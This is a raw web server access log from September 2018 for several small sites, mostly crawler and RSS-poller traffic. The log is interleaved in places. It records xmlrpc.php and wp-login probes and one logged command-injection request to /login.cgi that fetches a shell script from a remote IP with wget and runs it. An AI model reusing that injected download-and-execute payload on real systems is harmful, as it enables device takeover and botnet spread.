hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:18:40:32 +0300] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 200 345 3367 "http://hackerschool-bg.com/?page_id=189" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 361 - 1110
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:18:40:33 +0300] "GET /wp-content/plugins/tb2048game/style/main.css?ver=4.1 HTTP/1.1" 200 359 3127 "http://hackerschool-bg.com/?page_id=189" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 544 - 6467
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:18:40:33 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/flexslider.css?ver=4.1 HTTP/1.1" 200 372 1630 "http://hackerschool-bg.com/?page_id=189" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 316 - 1182.165.68.131 - - [14/Sep/2018:18:41:15 +0300] "POST /xmlrpc.php HTTP/1.1" 400 28 0 "-" "-" - 25 - 19648
07
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:18:40:34 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/jquery.prettyPhoto.js?ver=1.0 HTTP/1.1" 200 363 6330 "http://hackerschool-bg.com/?page_id=189" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 970 - 1381
hackschool.dmaster.org:80 66.249.87.51 - - [14/Sep/2018:18:40:34 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/jquery.flexslider-min.js?ver=1.0 HTTP/1.1" 200 366 5465 "http://hackerschool-bg.com/?page_id=189" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 846 - 1108
hackschool.dmaster.org:80 66.249.87.53 - - [14/Sep/2018:18:40:34 +0300] "GET /wp-content/themes/ninezeroseven-child/style.css?ver=4.1 HTTP/1.1" 200 362 1789 "http://hackerschool-bg.com/?page_id=189" "AdsBot-Google (+http://www.google.com/adsbot.html)" - 307 - 1109
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:18:40:57 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 190198 - 29738
www.telebid-pro.com:80 82.165.68.131 - - [14/Sep/2018:18:41:15 +0300] "POST /xmlrpc.php HTTP/1.1" 200 644 577 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8" - 37110 - 1106
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:18:41:23 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 38707 - 1110
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:18:42:19 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 36265 - 6467
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:18:43:46 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37571 - 1107
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:18:44:46 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 37907 - 1381
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:18:45:28 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 328840 - 1108
hackschool.dmaster.org:80 54.36.150.55 - - [14/Sep/2018:18:46:14 +0300] "GET /robots.txt HTTP/1.1" 404 180 372 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" - 114 - 1109
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:18:47:27 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 42330 - 29738
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:18:48:51 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 44814 - 19648
hackschool.dmaster.org:80 54.198.205.153 - - [14/Sep/2018:18:49:31 +0300] "GET /robots.txt HTTP/1.1" 404 229 372 "-" "CCBot/2.0 (https://commoncrawl.org/faq/)" - 108 - 1106
hackschool.dmaster.org:80 54.198.205.153 - - [14/Sep/2018:18:49:31 +0300] "GET / HTTP/1.1" 200 219 6913 "-" "CCBot/2.0 (https://commoncrawl.org/faq/)" - 148306 - 1110
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:18:50:28 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 36188 - 1107
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:18:50:37 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 194036 - 1381
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:18:51:28 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 36216 - 1108
hackschool.dmaster.org:80 46.229.168.65 - - [14/Sep/2018:18:51:43 +0300] "GET /?p=444&replytocom=7 HTTP/1.1" 200 222 8126 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)" - 71170 - 1109
tbcloud.dmaster.org:80 180.76.15.8 - - [14/Sep/2018:18:53:14 +0300] "GET /?p=1&replytocom=644 HTTP/1.1" 200 233 231999 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" - 1244819 - 1106
tbcloud.dmaster.org:80 180.76.15.157 - - [14/Sep/2018:18:53:19 +0300] "GET /?p=1&replytocom=644 HTTP/1.1" 200 210 700800 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" - 4018297 - 1110
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:18:54:17 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 187375 - 6467
www.telebid-pro.co103.78.141.90 - - [14/Sep/2018:19:01:46 +0300] "GET / HTTP/1.1" 403 183 373 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" - 289 - 1110
m:80 104.154.198.228 - - [14/Sep/2018:18:55:27 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 79294 - 1107
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:18:56:37 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 43086 - 1108
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:18:57:20 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 45305 - 1109
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:18:59:00 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 193824 - 29738
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:00:17 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 40885 - 19648
www.telebid-pro.com:80 18.188.94.118 - - [14/Sep/2018:19:02:05 +0300] "GET / HTTP/1.1" 200 228 6781 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/42.0" - 97296 - 6467
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:02:10 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 35710 - 1107
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:19:03:33 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 193598 - 1381
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:03:56 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 37184 - 1108
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:04:34 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 74086 - 1109
hackschool.dmaster.org:80 46.229.168.76 - - [14/Sep/2018:19:06:15 +0300] "GET /?author=11 HTTP/1.1" 200 213 8801 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)" - 102363 - 29738
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:08:09 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 38289 - 19648
www.pro-code.net:80 220.181.108.96 - - [14/Sep/2018:19:08:44 +0300] "GET /robots.txt HTTP/1.1" 404 230 372 "-" "Mozilla/551.38.12.21 - - [14/Sep/2018:19:14:19 +0300] "GET / HTTP/1.1" 403 170 373 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" - 197 - 1109
.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" - 115 - 1106
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:19:09:06 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 186170 - 1110
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:10:31 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 54381 - 6467
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:11:13 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 38960 - 1107
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:13:34 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 40129 - 1381
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:19:14:07 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 191955 - 1108
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:14:53 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37953 - 29738
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:15:44 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 62978 - 19648
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:17:56 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 38886 - 1106
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:19:18:03 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 188526 - 1110
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:18:42 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 48296 - 6467
tbcloud.dmaster.org:80 54.36.148.67 - - [14/Sep/2018:19:19:14 +0300] "GET /?recent_works=goals HTTP/1.1" 200 186 4332 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" - 56138 - 1107
hackschool.dmaster.org:80 45.61.191.100 - - [14/Sep/2018:19:19:17 +0300] "GET / HTTP/1.1" 200 277 6911 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0" - 161684 - 1381
www.telebid-pro.com:80 123.57.254.142 - - [14/Sep/2018:19:20:10 +0300] "POST /xmlrpc.php HTTP/1.1" 200 638 577 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8" - 66458 - 19648
www.telebid-pro.com:80 123.57.254.142 - - [14/Sep/2018:19:20:11 +0300] "POST /xmlrpc.php HTTP/1.1" 200 641 577 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8" - 36354 - 1106
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:20:56 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 37878 - 1110
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:21:38 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 36680 - 6467
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:19:23:06 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 187505 - 1107
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:24:25 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 57692 - 1381
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:25:56 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 38517 - 1108
www.pro-code.net:80 94.130.64.96 - - [14/Sep/2018:19:25:58 +0300] "GET /robots.txt HTTP/1.1" 404 257 372 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" - 120 - 1109
www.pro-code.net:80 94.130.64.96 - - [14/Sep/2018:19:25:58 +0300] "GET /robots.txt HTTP/1.1" 404 261 372 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" - 124 - 29738
www.pro-code.net:80 94.130.64.96 - - [14/Sep/2018:19:25:58 +0300] "GET / HTTP/1.1" 200 247 5093 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" - 73854 - 19648
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:19:26:43 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 191837 - 1106
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:27:25 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 36670 - 1110
hackschool.dmaster.org:80 188.92.75.244 - - [14/Sep/2018:19:27:51 +0300] "GET /?p=66 HTTP/1.0" 200 266 32593 "http://hackerschool-bg.com/?p=66#comment-8" "Mozilla/5.0 (Windows NT 5.1; rv:44.0) Gecko/20100101 Firefox/44.0" - 80084 - 6467
hackschool.dmaster.org:80 188.92.75.244 - - [14/Sep/2018:19:27:51 +0300] "POST /wp-comments-post.php HTTP/1.0" 500 583 3331 "http://hackerschool-bg.com/?p=66#comment-8" "Mozilla/5.0 (Windows NT 5.1; rv:44.0) Gecko/20100101 Firefox/44.0" - 48594 - 1107
hackschool.dmaster.org:80 188.92.75.244 - - [14/Sep/2018:19:27:51 +0300] "GET /?p=66 HTTP/1.0" 200 266 32592 "http://hackerschool-bg.com/?p=66#comment-8" "Mozilla/5.0 (Windows NT 5.1; rv:44.0) Gecko/20100101 Firefox/44.0" - 68810 - 1381
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:30:05 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 40618 - 1109
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:30:32 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 66393 - 29738
hackschool.dmaster.org:80 37.9.53.12 - - [14/Sep/2018:19:31:09 +0300] "POST /xmlrpc.php HTTP/1.1" 200 661 404 "http://hackerschool-bg.com/xmlrpc.php" "Mozilla/5.0 (Windows NT 5.1; WOW64; x64) AppleWebKit/531.71.28 (KHTML, like Gecko) Chrome/55.1.6967.1695 Safari/532.01 OPR/42.0.5245.9972" - 95941 - 19648
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:19:31:10 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 247197 - 1106
www.telebid-pro.com:80 18.219.142.57 - - [14/Sep/2018:19:31:55 +0300] "GET / HTTP/1.1" 200 201 6781 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Firefox/42.0" - 106299 - 1110
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:34:19 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 37238 - 6467
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:35:28 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 36564 - 1107
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:35:33 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 73015 - 1381
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:19:35:54 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 190211 - 1108
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:39:23 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 38872 - 29738
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:41:09 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 81174 - 19648
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:42:06 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 39553 - 1106
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:42:33 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 42353 - 1110
hackschool.dmaster.org:80 91.200.80.2 - - [14/Sep/2018:19:42:37 +0300] "GET /?p=560 HTTP/1.0" 200 325 104081 "http://hackerschool-bg.com/?p=560" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 OPR/55.0.2994.44" - 310603 - 6467
hackschool.dmaster.org:80 91.200.80.2 - - [14/Sep/2018:19:42:39 +0300] "POST /wp-comments-post.php HTTP/1.0" 500 2416 3331 "http://hackerschool-bg.com/?p=560" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 OPR/55.0.2994.44" - 37996 - 1107
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:19:42:48 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 240719 - 1381
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:46:07 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 70093 - 1108
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:47:19 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 38264 - 1109
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:19:47:38 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 192403 - 29738
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:48:10 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 37778 - 1110
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:50:21 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 46007 - 1107
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:19:51:53 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 202338 - 1381
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:54:34 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 36238 - 1108
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:19:54:39 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 37480 - 1109
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:55:00 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 51980 - 29738
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:19:56:06 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 188155 - 19648
easyps.bg:80 40.77.167.55 - - [14/Sep/2018:19:56:48 +0300] "GET / HTTP/1.1" 200 264 5947 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" - 48198 - 1106
hackschool.dmaster.org:80 54.208.102.37 - - [14/Sep/2018:19:58:26 +0300] "GET / HTTP/1.1" 200 311 6913 "http://hackerschool-bg.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" - 74558 - 1106
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:19:59:12 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 38257 - 1381
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:19:59:24 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 221173 - 1107
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:20:00:35 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 65650 - 1108
www.telebid-pro.com:80 185.85.239.110 - - [14/Sep/2018:20:01:45 +0300] "GET /wp-login.php HTTP/1.1" 403 319 385 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" - 111 - 1109
www.telebid-pro.com:80 52.14.43.100 - - [14/Sep/2018:20:01:56 +0300] "GET / HTTP/1.1" 200 204 6781 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Safari/602.1" - 95575 - 29738
www.pro-code.net:80 180.76.15.162 - - [14/Sep/2018:20:02:05 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/layout.css?ver=4.1 HTTP/1.1" 200 275 6900 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" - 929 - 19648
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:20:02:16 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 42626 - 1106
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:20:03:17 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 40598 - 1110
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:20:04:25 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 187082 - 6467
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:20:04:36 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 45870 - 1381
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:20:07:15 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37066 - 1107
hackschool.dmaster.org:80 46.229.168.147 - - [14/Sep/2018:20:08:27 +0300] "GET /robots.txt HTTP/1.1" 404 194 372 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)" - 145 - 1108
hackschool.dmaster.org:80 46.229.168.144 - - [14/Sep/2018:20:08:28 +0300] "GET /?p=892 HTTP/1.1" 200 209 9748 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)" - 73609 - 1109
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:20:08:37 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 192494 - 29738
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:20:08:56 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 50683 - 19648
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:20:09:17 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 40288 - 1106
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:20:10:28 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 36017 - 1110
hackschool.dmaster.org:80 216.244.66.250 - - [14/Sep/2018:20:11:14 +0300] "GET /robots.txt HTTP/1.1" 404 226 372 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" - 126 - 6467
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:20:12:25 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 194335 - 1381
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:20:13:59 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 39788 - 1107
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:20:14:32 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 40447 - 1108
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:20:15:08 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 40503 - 1109
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:20:16:44 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 328059 - 29738
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:20:18:23 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 36457 - 1106
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:20:20:23 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 52091 - 1110
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:20:20:58 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 191148 - 6467
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:20:22:22 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 36791 - 1381
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:20:23:09 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37072 - 1107
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:20:25:38 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 214114 - 1108
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:20:26:54 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 72293 - 1109
hackschool.dmaster.org:80 54.242.199.3 - - [14/Sep/2018:20:26:56 +0300] "GET /?feed=rss2&cat=5 HTTP/1.1" 200 442 10279 "https://www.google.com/" "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201" - 183205 - 29738
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:20:28:27 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37531 - 19648
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:20:29:12 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 68796 - 1106
hackschool.dmaster.org:80 46.229.168.144 - - [14/Sep/2018:20:29:17 +0300] "GET /?p=1453&replytocom=21 HTTP/1.1" 200 224 9241 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)185.244.25.188 - - [14/Sep/2018:20:30:18 +0300] "GET /login.cgi?cli=aa%20aa%27;wget%20http://176.32.33.165/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1" 400 202 0 "-" "Hakai/2.0" - 41 - 6467
" - 74268 - 1110
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:20:30:55 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 214242 - 6467
www.telebid-pro.com:80 18.222.108.192 - - [14/Sep/2018:20:31:55 +0300] "GET / HTTP/1.1" 200 180 6781 "-" "Mozilla/5.0 (X11; Linux x86_64) Trident/5.0 Safari/602.1" - 90422 - 1381
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:20:32:14 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37324 - 1107
